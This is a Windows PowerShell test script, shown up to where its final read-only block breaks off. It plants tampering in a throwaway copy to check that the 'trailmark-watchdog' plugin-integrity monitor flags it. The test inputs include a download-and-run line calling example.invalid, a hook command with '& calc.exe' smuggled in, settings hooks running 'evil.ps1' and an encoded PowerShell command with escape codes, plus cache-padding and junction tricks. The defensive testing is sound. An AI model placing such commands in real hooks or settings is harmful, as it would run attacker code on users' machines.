# test-trailmark-watchdog.ps1
# Shows trailmark-watchdog catching things, on a throwaway copy, with the real
# Windows features: Windows PowerShell 5.1 (what the scheduled task runs),
# alternate data streams, Mark of the Web, hidden files, junctions, Defender
# status and a real notification.
#
# It copies the release (both plugins and their marketplace files) into a
# test folder under %TEMP%, records it as
# known-good with its own state folder, changes things one step at a time and
# checks what the watchdog reports. Your real known-good list, log and
# scheduled task are only read, never changed. The test folder is deleted at
# the end. Log: test-trailmark-watchdog.log next to this file.

$ErrorActionPreference = 'Continue'
try { [Console]::OutputEncoding = [Text.Encoding]::UTF8 } catch { }
$here  = Split-Path -Parent $MyInvocation.MyCommand.Path
$srcWd = Join-Path $here 'trailmark-watchdog.ps1'
# The release folder this script belongs to (it sits in tools\windows).
$rel   = [IO.Path]::GetFullPath((Join-Path $here '..\..'))
$log   = Join-Path $here 'test-trailmark-watchdog.log'
$ps51  = Join-Path $env:windir 'System32\WindowsPowerShell\v1.0\powershell.exe'
$base  = Join-Path $env:TEMP ('jbwd-test-' + (Get-Date -Format 'yyyyMMdd-HHmmss'))
$root  = Join-Path $base 'claude-plugins-test'
$state = Join-Path $base 'state'
$wd    = Join-Path $base 'trailmark-watchdog.ps1'
$junction = Join-Path $root 'outside'
# A stand-in for %USERPROFILE%\.claude, so the checks outside the folder never
# read your real Claude Code settings or plugin cache.
$claudeTest = Join-Path $base 'claude'

Start-Transcript -Path $log -Force | Out-Null
$script:pass = 0; $script:fail = 0
function Step([string]$t) { Write-Host ''; Write-Host "=== $t" }
function Check([string]$Name, [bool]$Ok, [string]$Info = '') {
  if ($Ok) { $script:pass++; Write-Host ('  PASS  ' + $Name) }
  else { $script:fail++; Write-Host ('  FAIL  ' + $Name); if ($Info) { Write-Host ('        ' + $Info) } }
}
function Info([string]$Name, [string]$Value) { Write-Host ('  INFO  ' + $Name + ': ' + $Value) }

function Run-Wd([string[]]$A, [switch]$Defender, [switch]$RealAlert) {
  $extra = @('-StateDir', $state, '-ClaudeDir', $claudeTest)
  if (-not $Defender) { $extra += '-NoDefender' }
  if (-not $RealAlert) { $extra += '-DryRunAlert' }
  $out = & $ps51 -NoProfile -ExecutionPolicy Bypass -File $wd @A @extra 2>&1 | ForEach-Object { [string]$_ }
  return [pscustomobject]@{ Code = $LASTEXITCODE; Out = ($out -join "`n") }
}
function Last { return ([IO.File]::ReadAllText((Join-Path $state 'last-scan.json')) | ConvertFrom-Json) }
function Has($Scan, [string]$Sev, [string]$What, [string]$PathLike, [string]$DetailLike = '') {
  foreach ($f in @($Scan.findings)) {
    if ($f.Sev -ne $Sev -or $f.What -ne $What) { continue }
    if ($PathLike -and ([string]$f.Path) -notlike $PathLike) { continue }
    if ($DetailLike -and -not (@($f.Details) + @($f.Why) | Where-Object { $_ -like $DetailLike })) { continue }
    return $true
  }
  return $false
}
function Show($Scan) { return ((@($Scan.findings) | ForEach-Object { $_.Sev + ' ' + $_.What + ' ' + $_.Path + ' :: ' + $_.Why + ' :: ' + (@($_.Details) -join ' | ') }) -join ' || ') }
function Accept-All { $r = Run-Wd @('-Accept', '-Yes'); if ($r.Code -ne 0) { Write-Host $r.Out } }

function Remove-TestFolder {
  # Remove the junction on its own first, so nothing follows it into its target.
  if (Test-Path -LiteralPath $junction) { try { [IO.Directory]::Delete($junction, $false) } catch { } }
  if ((Split-Path -Leaf $base) -like 'jbwd-test-*' -and (Split-Path -Parent $base) -eq ($env:TEMP.TrimEnd('\'))) {
    Remove-Item -LiteralPath $base -Recurse -Force -ErrorAction SilentlyContinue
  }
}

Step 'Set up a throwaway copy'
if (-not (Test-Path -LiteralPath $srcWd)) { Write-Host '  trailmark-watchdog.ps1 is not next to this script.'; Stop-Transcript | Out-Null; Read-Host 'Press Enter to close' | Out-Null; exit 1 }
New-Item -ItemType Directory -Path $root -Force | Out-Null
New-Item -ItemType Directory -Path (Join-Path $claudeTest 'plugins\cache') -Force | Out-Null
Copy-Item -LiteralPath $srcWd -Destination $wd
if (-not (Test-Path -LiteralPath (Join-Path $rel '.claude-plugin\marketplace.json'))) { Write-Host ('  No release folder at ' + $rel); Stop-Transcript | Out-Null; Read-Host 'Press Enter to close' | Out-Null; exit 1 }
foreach ($d in @('.claude-plugin', '.agents', 'plugins')) { Copy-Item -LiteralPath (Join-Path $rel $d) -Destination (Join-Path $root $d) -Recurse }
New-Item -ItemType Directory -Path (Join-Path $root 'tools\windows') -Force | Out-Null
Set-Content -LiteralPath (Join-Path $root 'tools\windows\check.log') -Value 'tool log'
Set-Content -LiteralPath (Join-Path $root 'tool.ps1') -Value 'Write-Host hello'
Set-Content -LiteralPath (Join-Path $root 'notes.txt') -Value 'plain notes'
Set-Content -LiteralPath (Join-Path $root 'run.log') -Value 'log line'
New-Item -ItemType Directory -Path (Join-Path $root 'tm-hooktest-20260101-000000') | Out-Null
Set-Content -LiteralPath (Join-Path $root 'tm-hooktest-20260101-000000\gh.cmd') -Value '@echo off'
Write-Host ('  ' + $root)

Step 'Record and scan under Windows PowerShell 5.1'
$r = Run-Wd @('-Init', '-Root', $root, '-Yes')
Check 'records the folder' ($r.Code -eq 0 -and (Test-Path -LiteralPath (Join-Path $state 'baseline.json'))) $r.Out
Check 'summary lists the plugin hooks' ($r.Out -match 'SessionStart: node <plugin>/scripts/trailmark.js --hook session-start') $r.Out
Check 'commit-start and failure hooks are known (no ! mark)' (($r.Out -match 'PreToolUse: node <plugin>/scripts/trailmark.js --hook commit-start') -and ($r.Out -notmatch '! (PreToolUse|PostToolUseFailure):')) $r.Out
Check 'release layout: the marketplace entry is read from the top folder' ($r.Out -match 'Marketplace entry: trailmark -> \./plugins/trailmark') $r.Out
Check 'the Codex copy''s hooks are known (no ! mark)' (($r.Out -match 'PostToolUse: node <codex launcher> trailmark --hook milestone auto') -and ($r.Out -notmatch '! \w+: node -e')) $r.Out
$r = Run-Wd @('-Scan'); $s = Last
Check 'clean scan is OK' ($r.Code -eq 0 -and $s.top -eq 'OK') (Show $s)
Add-Content -LiteralPath (Join-Path $root 'run.log') -Value 'more'
Add-Content -LiteralPath (Join-Path $root 'tools\windows\check.log') -Value 'more'
Add-Content -LiteralPath (Join-Path $root 'tm-hooktest-20260101-000000\gh.cmd') -Value 'echo changed'
$r = Run-Wd @('-Scan'); $s = Last
Check 'logs and test folders are left alone' ($s.top -eq 'OK') (Show $s)

Step 'Content changes'
$jbm = Join-Path $root 'plugins\trailmark\scripts\trailmark.js'
Add-Content -LiteralPath $jbm -Value "const https = require('https');"
Set-Content -LiteralPath (Join-Path $root 'new.ps1') -Value 'iex (iwr http://example.invalid/x)'
$r = Run-Wd @('-Scan'); $s = Last
Check 'plugin code change is HIGH, with the added line' (Has $s 'HIGH' 'changed' '*scripts/trailmark.js' "! line *network, code loading*require('https')*") (Show $s)
Check 'new download-and-run script is HIGH' ((Has $s 'HIGH' 'added' 'new.ps1' '! line 1, downloads*') -and (Has $s 'HIGH' 'added' 'new.ps1' '! line 1, runs text as code*')) (Show $s)
Accept-All

Step 'Hook changes'
# A hook on an event trailmark doesn't use, and trailmark.js run with the wrong
# --hook name for its event, are each reported.
$hooksFile = Join-Path $root 'plugins\trailmark\hooks\hooks.json'
$hj = [IO.File]::ReadAllText($hooksFile) | ConvertFrom-Json
$extraHook = [pscustomobject]@{ hooks = @([pscustomobject]@{ type = 'command'; command = 'node'; args = @('${CLAUDE_PLUGIN_ROOT}/scripts/trailmark.js', '--hook', 'session-start') }) }
$hj.hooks | Add-Member -NotePropertyName 'UserPromptSubmit' -NotePropertyValue @($extraHook)
$hj.hooks.PreToolUse[0].hooks[0].args[2] = 'milestone'
[IO.File]::WriteAllText($hooksFile, ($hj | ConvertTo-Json -Depth 20), (New-Object System.Text.UTF8Encoding $false))
$r = Run-Wd @('-Scan'); $s = Last
Check 'hook on a new event is HIGH' (Has $s 'HIGH' 'changed' '*hooks/hooks.json' '! new hook event: UserPromptSubmit*') (Show $s)
Check 'trailmark.js with the wrong --hook for its event is HIGH' (Has $s 'HIGH' 'changed' '*hooks/hooks.json' '! trailmark.js hook with a --hook name its event does not use: PreToolUse*') (Show $s)
Accept-All
# The Codex copy's hook command with something added after the launcher.
$codexHooks = Join-Path $root 'plugins\trailmark-codex\hooks\hooks.json'
$cj = [IO.File]::ReadAllText($codexHooks) | ConvertFrom-Json
$cj.hooks.SessionStart[0].hooks[0].command = [string]$cj.hooks.SessionStart[0].hooks[0].command + ' & calc.exe'
[IO.File]::WriteAllText($codexHooks, ($cj | ConvertTo-Json -Depth 20), (New-Object System.Text.UTF8Encoding $false))
$r = Run-Wd @('-Scan'); $s = Last
Check 'a Codex hook command with anything added is HIGH' (Has $s 'HIGH' 'changed' 'plugins/trailmark-codex/hooks/hooks.json' '! hook runs something other than trailmark.js: SessionStart*') (Show $s)
Accept-All

Step 'Outside the folder: plugin cache and settings hooks'
$cached = Join-Path $claudeTest 'plugins\cache\old-local\trailmark\0.2.0\scripts'
New-Item -ItemType Directory -Path $cached -Force | Out-Null
Set-Content -LiteralPath (Join-Path $cached 'trailmark.js') -Value '// old copy'
Set-Content -LiteralPath (Join-Path $claudeTest 'settings.json') -Value '{"hooks":{"PostToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"powershell -File C:\\x\\evil.ps1"}]}]}}'
$r = Run-Wd @('-Scan'); $s = Last
Check 'a trailmark copy in the plugin cache is HIGH' (Has $s 'HIGH' 'cache' '<claude>/plugins/cache/old-local/trailmark/0.2.0') (Show $s)
Check 'a new hook in user settings is HIGH, with the hook' (Has $s 'HIGH' 'settings' '<claude>/settings' '+ settings.json: hook PostToolUse (command) powershell*') (Show $s)
Accept-All
Add-Content -LiteralPath (Join-Path $cached 'trailmark.js') -Value '// changed'
$r = Run-Wd @('-Scan'); $s = Last
Check 'an accepted cached copy that changes is HIGH again' (Has $s 'HIGH' 'cache' '<claude>/plugins/cache/old-local/trailmark/0.2.0' '*') (Show $s)
Accept-All
# Claude Code may run a local plugin from a copy in its cache: a copy that
# matches the watched plugin is the installed one, not a stray.
Copy-Item -LiteralPath (Join-Path $root 'plugins\trailmark') -Destination (Join-Path $claudeTest 'plugins\cache\old-local\trailmark\9.9.9') -Recurse
$r = Run-Wd @('-Scan'); $s = Last
Check 'a cached copy identical to the watched plugin is not flagged' (-not (Has $s 'HIGH' 'cache' '<claude>/plugins/cache/old-local/trailmark/9.9.9')) (Show $s)
Accept-All
# The copy Claude Code lists as installed is the one it runs: a change to
# it is HIGH even though the watched folder is untouched.
$inst = Join-Path $claudeTest 'plugins\cache\old-local\trailmark\9.9.9'
Set-Content -LiteralPath (Join-Path $claudeTest 'plugins\installed_plugins.json') -Value ('{"version":2,"plugins":{"trailmark@old-local":[{"scope":"user","installPath":' + (ConvertTo-Json $inst) + '}]}}')
Accept-All
Add-Content -LiteralPath (Join-Path $inst 'scripts\trailmark.js') -Value '// tampered'
$r = Run-Wd @('-Scan'); $s = Last
Check 'a change to the installed cache copy is HIGH' (Has $s 'HIGH' 'cache' '<claude>/plugins/cache/old-local/trailmark/9.9.9') (Show $s)
Remove-Item -LiteralPath (Join-Path $claudeTest 'plugins\installed_plugins.json')
Accept-All
# Attacks from the security review: padding, links, escape codes, other
# settings that run commands.
$pad = Join-Path $claudeTest 'plugins\cache'
for ($i = 0; $i -lt 210; $i++) { New-Item -ItemType Directory -Path (Join-Path $pad ('a' + $i.ToString('000'))) -Force | Out-Null }
Add-Content -LiteralPath (Join-Path $cached 'trailmark.js') -Value '// tampered behind padding'
$r = Run-Wd @('-Scan'); $s = Last
Check 'a padded plugin cache is HIGH, not a silent short list' (Has $s 'HIGH' 'cache' '<claude>/plugins/cache' '*more than 200 folders*') (Show $s)
Check 'a copy accepted before is still checked behind padding' (Has $s 'HIGH' 'cache' '<claude>/plugins/cache/old-local/trailmark/0.2.0') (Show $s)
Get-ChildItem -LiteralPath $pad -Directory | Where-Object { $_.Name -match '^a\d{3}$' } | Remove-Item -Recurse -Force
Accept-All
$jt = Join-Path $base 'junction-target'
New-Item -ItemType Directory -Path $jt -Force | Out-Null
New-Item -ItemType Junction -Path (Join-Path $pad 'old-local\trailmark\0.0.1') -Target $jt | Out-Null
$r = Run-Wd @('-Scan'); $s = Last
Check 'a junction where a trailmark copy can be is HIGH, not followed' (Has $s 'HIGH' 'cache' '<claude>/plugins/cache/old-local/trailmark/0.0.1' '*link:*') (Show $s)
Remove-Item -LiteralPath (Join-Path $pad 'old-local\trailmark\0.0.1') -Force
Accept-All
$e = [char]27
Set-Content -LiteralPath (Join-Path $claudeTest 'settings.json') -Value ('{"statusLine":{"type":"command","command":"node C:\\x\\s.js"},"apiKeyHelper":"C:\\x\\k.cmd","hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"powershell -enc AAAA\u001b[2K\r\u001b[1A"}]}]}}')
$r = Run-Wd @('-Scan'); $s = Last
Check 'statusLine and apiKeyHelper are watched' ((Has $s 'HIGH' 'settings' '<claude>/settings' '+ settings.json: statusLine*') -and (Has $s 'HIGH' 'settings' '<claude>/settings' '+ settings.json: apiKeyHelper*')) (Show $s)
$st = Run-Wd @('-Status')
Check 'no escape code reaches the screen or the log' ((-not $st.Out.Contains([string]$e)) -and (-not ([IO.File]::ReadAllText((Join-Path $state 'watchdog.log'))).Contains([string]$e))) ''
Set-Content -LiteralPath (Join-Path $claudeTest 'settings.json') -Value '{"hooks":{},"Hooks":{}}'
$r = Run-Wd @('-Scan'); $s = Last
Info 'settings with a duplicate key' $(if (Has $s 'HIGH' 'settings' '<claude>/settings') { 'HIGH (could not be read)' } else { 'read by this PowerShell: ' + (Show $s) })
Set-Content -LiteralPath (Join-Path $claudeTest 'settings.json') -Value '{}'
Accept-All

Step 'Windows-only tricks'
$dl = Join-Path $root 'downloaded.txt'
Set-Content -LiteralPath $dl -Value 'hello'
Set-Content -LiteralPath $dl -Stream 'Zone.Identifier' -Value "[ZoneTransfer]`r`nZoneId=3`r`nHostUrl=https://example.invalid/file.txt"
Set-Content -LiteralPath (Join-Path $root 'notes.txt') -Stream 'payload' -Value 'tucked away'
$tool = Get-Item -LiteralPath (Join-Path $root 'tool.ps1')
$tool.Attributes = $tool.Attributes -bor [IO.FileAttributes]::Hidden
$target = Join-Path $base 'outside-target'
New-Item -ItemType Directory -Path $target -Force | Out-Null
Set-Content -LiteralPath (Join-Path $target 'f.txt') -Value 'outside'
New-Item -ItemType Junction -Path $junction -Target $target | Out-Null
$r = Run-Wd @('-Scan'); $s = Last
Check 'downloaded file is flagged with where it came from' (Has $s 'MEDIUM' 'stream' 'downloaded.txt' '*HostUrl=https://example.invalid/file.txt*') (Show $s)
Check 'hidden data stream on an unchanged file is HIGH' (Has $s 'HIGH' 'stream' 'notes.txt' 'hidden data stream payload added*') (Show $s)
Check 'file made hidden is MEDIUM' (Has $s 'MEDIUM' 'flags' 'tool.ps1' 'now marked hidden*') (Show $s)
Check 'junction is HIGH and not followed' ((Has $s 'HIGH' 'link' 'outside') -and -not (Has $s 'LOW' 'added' 'outside/f.txt')) (Show $s)
Accept-All

Step 'After accepting: hidden files, links and open files'
Set-Content -LiteralPath (Join-Path $root 'tool.ps1') -Stream 'later' -Value 'added after the file was hidden'
$target2 = Join-Path $base 'outside-target-2'
New-Item -ItemType Directory -Path $target2 -Force | Out-Null
[IO.Directory]::Delete($junction, $false)
New-Item -ItemType Junction -Path $junction -Target $target2 | Out-Null
# Keep trailmark.js open for writing, the way an editor or another program might,
# and change it through that handle.
$held = New-Object IO.FileStream -ArgumentList $jbm, ([IO.FileMode]::Open), ([IO.FileAccess]::ReadWrite), ([IO.FileShare]::Read)
try {
  [void]$held.Seek(0, [IO.SeekOrigin]::End)
  $bytes = [Text.Encoding]::ASCII.GetBytes("`r`nconst net = require('net');`r`n")
  $held.Write($bytes, 0, $bytes.Length)
  $held.Flush()
  $r = Run-Wd @('-Scan'); $s = Last
} finally { $held.Dispose() }
Check 'stream added to an accepted hidden file is HIGH' (Has $s 'HIGH' 'stream' 'tool.ps1' 'hidden data stream later added*') (Show $s)
Check 'accepted junction pointed somewhere else is HIGH' (Has $s 'HIGH' 'link' 'outside' "now *outside-target-2*") (Show $s)
Check 'file held open for writing is still read and checked' (Has $s 'HIGH' 'changed' '*scripts/trailmark.js' "! line *require('net')*") (Show $s)
Accept-All

Step 'Another program holding a state file open'
# Hold last-scan.json open without delete sharing, the way the unknown program
# did at 11:21 pm on 10/17, while a scan tries to replace it. The watchdog
# should name the holder (this test's own PowerShell) and still report the failure.
$ls = Join-Path $state 'last-scan.json'
$held = New-Object IO.FileStream -ArgumentList $ls, ([IO.FileMode]::Open), ([IO.FileAccess]::Read), ([IO.FileShare]::Read)
try { $r = Run-Wd @('-Scan') } finally { $held.Dispose() }
$tail = (Get-Content -LiteralPath (Join-Path $state 'watchdog.log') -Tail 6) -join ' / '
Check 'a refused save is logged with the process holding the file' (($tail -match 'refused +saving last-scan.json') -and ($tail -match '(?i)holding last-scan.json: .*(pwsh|powershell)')) $tail
Check 'the failure is still reported, not hidden' (($r.Code -eq 2) -and ($tail -match 'error +could not save last-scan.json, held open by')) $tail
Info 'holder named' ((@(Get-Content -LiteralPath (Join-Path $state 'watchdog.log') -Tail 6) | Where-Object { $_ -match 'holding last-scan.json' }) -join ' ')
$r = Run-Wd @('-Scan')
Check 'the next scan saves normally again' (($r.Code -eq 0) -and ((Get-Item -LiteralPath $ls).LastWriteTime -gt (Get-Date).AddMinutes(-1))) $r.Out

Step 'File watchers and slow readers'
# A stand-in file watcher: a thread that keeps opening last-scan.json and any
# ~RF placeholder for a moment (attributes only, everything shared), the way
# Raycast and Unity Hub did in the Procmon captures on 10/18.
$racerSource = @'
using System;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
public static class JbwdTestRacer {
  [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
  static extern IntPtr CreateFileW(string name, uint access, uint share, IntPtr sec, uint disp, uint flags, IntPtr tmpl);
  [DllImport("kernel32.dll")]
  static extern bool CloseHandle(IntPtr h);
  static volatile bool stop;
  static Thread t;
  static long hits;
  public static long Hits { get { return Interlocked.Read(ref hits); } }
  static void Touch(string f, long hold) {
    IntPtr h = CreateFileW(f, 0x80 | 0x100000, 7, IntPtr.Zero, 3, 0x02000000, IntPtr.Zero);
    if (h == new IntPtr(-1)) return;
    Interlocked.Increment(ref hits);
    long end = Stopwatch.GetTimestamp() + hold;
    while (Stopwatch.GetTimestamp() < end) { }
    CloseHandle(h);
  }
  public static void Start(string dir, string file) {
    Stop();
    stop = false; hits = 0;
    long hold = Stopwatch.Frequency * 150 / 1000000;
    t = new Thread(delegate() {
      while (!stop) {
        try { foreach (string f in Directory.GetFiles(dir, "*~RF*.TMP")) Touch(f, hold); Touch(file, hold); } catch { }
      }
    });
    t.IsBackground = true;
    t.Start();
  }
  public static void Stop() { stop = true; if (t != null) { t.Join(); t = null; } }
}
'@
$racerOk = $true
try { if (-not ('JbwdTestRacer' -as [type])) { Add-Type -TypeDefinition $racerSource -ErrorAction Stop } } catch { $racerOk = $false; Info 'stand-in file watcher' ('could not compile: ' + $_.Exception.Message) }
$wdLog = Join-Path $state 'watchdog.log'
function Count-LogLines([string]$Pattern) { return @(Get-Content -LiteralPath $wdLog | Where-Object { $_ -match $Pattern }).Count }

if ($racerOk) {
  $runs = 8
  $refusedBefore = Count-LogLines 'refused +saving last-scan.json'
  $fallbackBefore = Count-LogLines 'note +saving with File.Replace'
  $codes = @()
  [JbwdTestRacer]::Start($state, $ls)
  try { for ($i = 0; $i -lt $runs; $i++) { $codes += (Run-Wd @('-Scan')).Code } } finally { [JbwdTestRacer]::Stop() }
  $hits = [JbwdTestRacer]::Hits
  $refused = (Count-LogLines 'refused +saving last-scan.json') - $refusedBefore
  $fallback = (Count-LogLines 'note +saving with File.Replace') - $fallbackBefore
  Check 'scans save with the POSIX rename, not the File.Replace fallback' ($fallback -eq 0) ((Get-Content -LiteralPath $wdLog -Tail 4) -join ' / ')
  Check ('saves go through while a file watcher keeps opening last-scan.json (' + $runs + ' scans)') ((@($codes | Where-Object { $_ -ne 0 }).Count -eq 0) -and ($refused -eq 0)) ('exit codes ' + ($codes -join ',') + ', refused ' + $refused + ', watcher opened ' + $hits)
  Info 'stand-in watcher opened' ([string]$hits + ' handles during those scans')

  # The same with the old save (File.Replace), to show what the watcher does to it.
  # A refusal here is expected now and then; the retry should still get the save through.
  $retriedBefore = Count-LogLines 'retried +saved last-scan.json'
  $refusedBefore = Count-LogLines 'refused +saving last-scan.json'
  $codes = @()
  $env:JBWD_SAVE = 'replace'
  [JbwdTestRacer]::Start($state, $ls)
  try { for ($i = 0; $i -lt $runs; $i++) { $codes += (Run-Wd @('-Scan')).Code } } finally { [JbwdTestRacer]::Stop(); Remove-Item Env:\JBWD_SAVE -ErrorAction SilentlyContinue }
  $retried = (Count-LogLines 'retried +saved last-scan.json') - $retriedBefore
  $refused = (Count-LogLines 'refused +saving last-scan.json') - $refusedBefore
  Check 'the File.Replace fallback says so in the log' ((Count-LogLines 'note +saving with File.Replace, JBWD_SAVE=replace') -gt 0) ''
  Info 'File.Replace with the same watcher' ('' + $runs + ' scans: ' + $retried + ' needed a retry, ' + $refused + ' refused after all tries, exit codes ' + ($codes -join ','))
} else {
  Info 'file watcher checks' 'skipped'
}

# A reader that has last-scan.json open without allowing delete, and lets go
# while the save is retrying.
$tmpFile = $ls + '.tmp'
if (Test-Path -LiteralPath $tmpFile) { Remove-Item -LiteralPath $tmpFile -Force }
$psi = New-Object Diagnostics.ProcessStartInfo
$psi.FileName = $ps51
# -ClaudeDir too, like every other run here: without it this scan read your
# real Claude Code settings, found runners the test's list doesn't have, and
# exited 1 even though the save went through.
$psi.Arguments = '-NoProfile -ExecutionPolicy Bypass -File "' + $wd + '" -Scan -StateDir "' + $state + '" -ClaudeDir "' + $claudeTest + '" -NoDefender -DryRunAlert'
$psi.UseShellExecute = $false
$psi.CreateNoWindow = $true
$held = New-Object IO.FileStream -ArgumentList $ls, ([IO.FileMode]::Open), ([IO.FileAccess]::Read), ([IO.FileShare]::Read)
$p = $null
try {
  $p = [Diagnostics.Process]::Start($psi)
  $sw = [Diagnostics.Stopwatch]::StartNew()
  while (-not (Test-Path -LiteralPath $tmpFile) -and $sw.Elapsed.TotalSeconds -lt 60 -and -not $p.HasExited) { Start-Sleep -Milliseconds 20 }
  # The first try fails as soon as the .tmp file exists. Let go 1.5 s later,
  # inside the retries (usually after the watchdog has asked who holds it).
  Start-Sleep -Milliseconds 1500
} finally { $held.Dispose() }
$exited = $p.WaitForExit(60000)
if (-not $exited) { try { $p.Kill() } catch { } }
$code = $(if ($exited) { $p.ExitCode } else { -1 })
$tail = (Get-Content -LiteralPath $wdLog -Tail 6) -join ' / '
Check 'a reader that lets go within 2 s no longer fails the save' (($code -eq 0) -and ($tail -match 'retried +saved last-scan.json on try [2-6] \(rename\)')) ('exit ' + $code + ' / ' + $tail)
Info 'who the retry named' ((@(Get-Content -LiteralPath $wdLog -Tail 6) | Where-Object { $_ -match 'holding last-scan.json:' }) -join ' ')

# What the rename helper costs: a scan with it, and one with File.Replace.
$t1 = (Measure-Command { [void](Run-Wd @('-Scan')) }).TotalSeconds
$env:JBWD_SAVE = 'replace'
try { $t2 = (Measure-Command { [void](Run-Wd @('-Scan')) }).TotalSeconds } finally { Remove-Item Env:\JBWD_SAVE -ErrorAction SilentlyContinue }
Info 'scan time' ('{0:N1} s with the POSIX rename, {1:N1} s with File.Replace (the difference is mostly compiling the helper)' -f $t1, $t2)

Step 'Defender'
$r = Run-Wd @('-Scan') -Defender; $s = Last
Info 'Defender as this account sees it' ([string]$s.defender)
Check 'scan with Defender checks still runs' ($r.Code -eq 0 -or $r.Code -eq 1) $r.Out

Step 'Real notification'
Add-Content -LiteralPath $jbm -Value '// second test edit'
$r = Run-Wd @('-Scan') -RealAlert
$alert = $null
try { $alert = [IO.File]::ReadAllText((Join-Path $state 'alert-state.json')) | ConvertFrom-Json } catch { }
$method = $(if ($alert) { [string]$alert.method } else { 'none' })
Info 'shown by' $method
Check 'a HIGH notification was sent in the stay-on-screen style (whether it stays is for your eyes)' ($method -eq 'notification, stays on screen') $r.Out
Write-Host '  You should see "trailmark-watchdog: HIGH in claude-plugins-test". It stays until you click Dismiss.'
Read-Host '  Press Enter once you have looked at it (dismiss it or not, either is fine)' | Out-Null

Step 'Reminder at logon or unlock'
$r = Run-Wd @('-Scan', '-Remind') -RealAlert
$tail = (Get-Content -LiteralPath (Join-Path $state 'watchdog.log') -Tail 3) -join ' / '
Check 'a reminder repeats a notification you may have missed, in the stay-on-screen style' ($tail -match 'remind +HIGH .*alert: notification, stays on screen') $tail
Write-Host '  You should see "trailmark-watchdog reminder: HIGH still waiting in claude-plugins-test". It stays until you click Dismiss.'
$r = Run-Wd @('-Scan', '-Remind') -RealAlert
$tail = (Get-Content -LiteralPath (Join-Path $state 'watchdog.log') -Tail 3) -join ' / '
Check 'a second unlock within 10 minutes is held back' ($tail -match 'remind +HIGH .*alert: already reminded') $tail

Step '1.6.0 review fixes'
# A manifest planted for the other layout is reported, and accepting it
# doesn't switch the layout.
New-Item -ItemType Directory -Path (Join-Path $root 'jb-memory-marketplace\.claude-plugin') -Force | Out-Null
Copy-Item -LiteralPath (Join-Path $rel '.claude-plugin\marketplace.json') -Destination (Join-Path $root 'jb-memory-marketplace\.claude-plugin\marketplace.json')
$r = Run-Wd @('-Scan'); $s = Last
Check 'a planted nested-layout manifest is HIGH' (Has $s 'HIGH' 'added' 'jb-memory-marketplace/.claude-plugin/marketplace.json') (Show $s)
$r = Run-Wd @('-Accept', '-Yes')
Check 'accepting it keeps the recorded layout' ((([IO.File]::ReadAllText((Join-Path $state 'baseline.json')) | ConvertFrom-Json).layout -eq 'root') -and ($r.Out -match 'Keeping root')) $r.Out
Remove-Item -LiteralPath (Join-Path $root 'jb-memory-marketplace') -Recurse -Force
Accept-All
# Command settings beyond the *Helper ones.
$settingsFile = Join-Path $claudeTest 'settings.json'
$hadSettings = Test-Path -LiteralPath $settingsFile
$oldSettings = $(if ($hadSettings) { [IO.File]::ReadAllText($settingsFile) } else { '' })
[IO.File]::WriteAllText($settingsFile, '{"fileSuggestion":{"type":"command","command":"powershell -enc AAAA"},"subagentStatusLine":{"type":"command","command":"x"},"processWrapper":"y"}', (New-Object System.Text.UTF8Encoding $false))
$r = Run-Wd @('-Scan'); $s = Last
Check 'fileSuggestion, subagentStatusLine and processWrapper are watched' ((Has $s 'HIGH' 'settings' '*' '*fileSuggestion*') -and (Has $s 'HIGH' 'settings' '*' '*subagentStatusLine*') -and (Has $s 'HIGH' 'settings' '*' '*processWrapper*')) (Show $s)
if ($hadSettings) { [IO.File]::WriteAllText($settingsFile, $oldSettings, (New-Object System.Text.UTF8Encoding $false)) } else { Remove-Item -LiteralPath $settingsFile -Force }
Accept-All

Step 'The older layout (marketplace in a jb-memory-marketplace subfolder)'
$root2  = Join-Path $base 'nested-test'
$state2 = Join-Path $base 'state2'
New-Item -ItemType Directory -Path (Join-Path $root2 'jb-memory-marketplace') -Force | Out-Null
foreach ($d in @('.claude-plugin', 'plugins')) { Copy-Item -LiteralPath (Join-Path $rel $d) -Destination (Join-Path $root2 ('jb-memory-marketplace\' + $d)) -Recurse }
# The older layout held the plugin as plugins\jb-memory, from before the rename.
Rename-Item -LiteralPath (Join-Path $root2 'jb-memory-marketplace\plugins\trailmark') -NewName 'jb-memory'
$o = & $ps51 -NoProfile -ExecutionPolicy Bypass -File $wd -Init -Root $root2 -Yes -StateDir $state2 -ClaudeDir $claudeTest -NoDefender -DryRunAlert 2>&1 | ForEach-Object { [string]$_ }
Check 'nested layout is recorded' (([IO.File]::ReadAllText((Join-Path $state2 'baseline.json')) | ConvertFrom-Json).layout -eq 'nested') ($o -join ' ')
Add-Content -LiteralPath (Join-Path $root2 'jb-memory-marketplace\plugins\jb-memory\scripts\trailmark.js') -Value '// changed'
$o = & $ps51 -NoProfile -ExecutionPolicy Bypass -File $wd -Scan -StateDir $state2 -ClaudeDir $claudeTest -NoDefender -DryRunAlert 2>&1 | ForEach-Object { [string]$_ }
$s2 = [IO.File]::ReadAllText((Join-Path $state2 'last-scan.json')) | ConvertFrom-Json
Check 'nested layout: a plugin change is HIGH' (Has $s2 'HIGH' 'changed' 'jb-memory-marketplace/plugins/jb-memory/scripts/trailmark.js') (Show $s2)

Step 'PowerShell 7'
$pwsh = Get-Command pwsh -ErrorAction SilentlyContinue
if ($pwsh) {
  $out = & $pwsh.Source -NoProfile -ExecutionPolicy Bypass -File $wd -Status -StateDir $state -ClaudeDir $claudeTest -NoDefender 2>&1 | ForEach-Object { [string]$_ }
  $code = $LASTEXITCODE
  # Exit 0 with nothing to report, 1 with findings; either way the full
  # status must print. (The check used to need findings, which only came
  # from reading your real settings by mistake.)
  Check '-Status works under PowerShell 7' ((@(0, 1) -contains $code) -and (($out -join "`n") -match 'Scanned now:\s+\d+ files, result \w+')) ('exit ' + $code + ' / ' + ($out -join ' '))
} else { Info 'PowerShell 7' 'pwsh not found on PATH, skipped' }

Step 'Your installed watchdog (read only)'
$realState = Join-Path $env:LOCALAPPDATA 'trailmark-watchdog'
$task = Get-ScheduledTask -TaskName 'trailmark-watchdog' -ErrorAction SilentlyContinue
if ($task) {
  $ti = Get-ScheduledTaskInfo -TaskName 'trailmark-watchdog'
  Info 'task' ([string]$task.State + ', last run ' + $ti.LastRunTime + ' (result ' + $ti.LastTaskResult + '), next run ' + $ti.NextRunTime)
  $rt = Get-ScheduledTask -TaskName 'trailmark-watchdog-reminder' -ErrorAction SilentlyContinue
  if ($rt) {
    $rti = Get-ScheduledTaskInfo -TaskName 'trailmark-watchdog-reminder'
